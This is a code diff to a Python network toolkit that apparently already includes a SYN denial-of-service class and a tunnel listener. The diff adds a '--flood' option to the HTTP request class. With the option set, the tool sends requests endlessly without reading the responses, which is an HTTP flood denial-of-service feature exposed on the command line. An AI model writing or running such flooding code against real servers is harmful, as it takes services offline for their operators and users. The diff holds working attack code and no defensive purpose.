@@ -1432,7 +1432,7 @@ class DoS_SYN :
 
 
 class HTTP_Request :
-    def __init__(self, host : str, port : int, method : str, header : str, end : str, https : bool, quiet : bool) -> None :
+    def __init__(self, host : str, port : int, method : str, header : str, end : str, https : bool, quiet : bool, flood : bool) -> None :
         self.host = host
         self.port = int(port)
         self.method = method if (method in ("GET", "HEAD")) else "GET"
@@ -1440,6 +1440,7 @@ class HTTP_Request :
         self.end = end if end else "/"
         self.https = bool(https)
         self.quiet = bool(quiet)
+        self.flood = bool(flood)
         self.request_header = str()
         self.response = bytes()
         self.response_header = str()
@@ -1471,7 +1472,12 @@ class HTTP_Request :
         return self.response_header, self.response
 
     def request(self) -> None :
-        self.__request()
+        if (self.flood) :
+            while True :
+                print("REQUEST")
+                self.__request()
+        else :
+            self.__request()
         return
 
     def __request(self) -> None :
@@ -1484,7 +1490,7 @@ class HTTP_Request :
             http.connect((self.host, self.port))
             http.send(self.request_header.encode())
             raw_data = bytes()
-            while True :
+            while not self.flood :
                 response = http.recv(1024)
                 if not response :
                     header, data = self.parse_response_header(raw_data)
@@ -1731,6 +1737,7 @@ if not Constant.MODULE :
         http_tool.add_argument("-e", "--endpoint", type = str, help = "sets endpoint", default = "/")
         http_tool.add_argument("-s", "--secure", action = "store_true", help = "enables secure socket(ssl)", default = False)
         http_tool.add_argument("-q", "--quiet", action = "store_true", help = "enables quiet mode", default = False)
+        http_tool.add_argument("-f", "--flood", action = "store_true", help = "enables flood mode", default = False)
         http_tool.set_defaults(func = HTTP_Request_args)
         tunnel_tool = subparser.add_parser("tunnel", help = "execute http tunnel listener")
         tunnel_tool.add_argument("-x", "--host", type = str, help = "sets host", default = "0.0.0.0")
@@ -1863,7 +1870,8 @@ if not Constant.MODULE :
             args.custom,
             args.endpoint,
             args.secure,
-	    args.quiet
+            args.quiet,
+            args.flood
             )
         client.request()
         return
